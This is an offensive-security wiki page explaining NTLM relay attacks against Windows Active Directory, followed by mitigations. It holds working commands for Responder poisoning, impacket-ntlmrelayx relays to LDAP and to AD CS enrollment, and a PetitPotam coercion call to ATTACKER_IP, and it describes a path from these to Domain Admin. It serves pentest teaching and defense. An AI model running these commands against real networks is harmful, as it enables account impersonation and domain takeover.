# NTLM Relay

NTLM relay is a man-in-the-middle attack against Windows authentication. You do not crack anything - you capture an authentication attempt from a victim and **forward (relay) it** to another service, authenticating to that service as the victim. It is one of the most reliable ways to move from "no creds" to "domain foothold," especially combined with coercion.

## How it works

1. You get a victim (user or machine account) to authenticate to *you*.
2. Your relay tool forwards that NTLM auth to a target service that does not enforce signing.
3. The target accepts it; you now act as the victim on that service.

The classic chain is: coerce a Domain Controller or server into authenticating to you, then relay it to something useful (LDAP, SMB, or AD CS web enrollment for [ESC8](AD%20CS%20Attacks%20(ESC).md)).

## Getting the victim to authenticate (coercion)

- **Responder** - poison LLMNR/NBT-NS/mDNS so hosts send auth to you
- **PetitPotam** (MS-EFSRPC), **PrinterBug** (MS-RPRN), **Coercer** - force a machine account to authenticate

## Running the relay

```bash
# Poison name resolution to harvest/relay auth
responder -I eth0

# Relay to LDAP to grant yourself rights / RBCD
impacket-ntlmrelayx -t ldap://10.0.0.1 --delegate-access

# Relay to AD CS web enrollment (ESC8) to grab a cert as the DC
impacket-ntlmrelayx -t http://ca.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Coerce a DC to authenticate to you (then relay)
python3 PetitPotam.py ATTACKER_IP DC_IP
```

Relaying a **machine account** to AD CS (ESC8) and then using the cert to [DCSync](DCSync.md) is a well-worn path to Domain Admin.

## Mitigation

- Enable **SMB signing** everywhere (required, not just enabled).
- Enable **LDAP signing and channel binding** on DCs.
- Enable **Extended Protection for Authentication (EPA)** on AD CS and other HTTP auth endpoints.
- Disable LLMNR and NBT-NS; patch the coercion vectors.
- Monitor for unexpected machine-account authentication.

## Related

- [AD CS Attacks (ESC)](AD%20CS%20Attacks%20(ESC).md) (ESC8/ESC11 rely on relay)
- [Pass-the-Hash](Pass-the-Hash.md), [DCSync](DCSync.md)
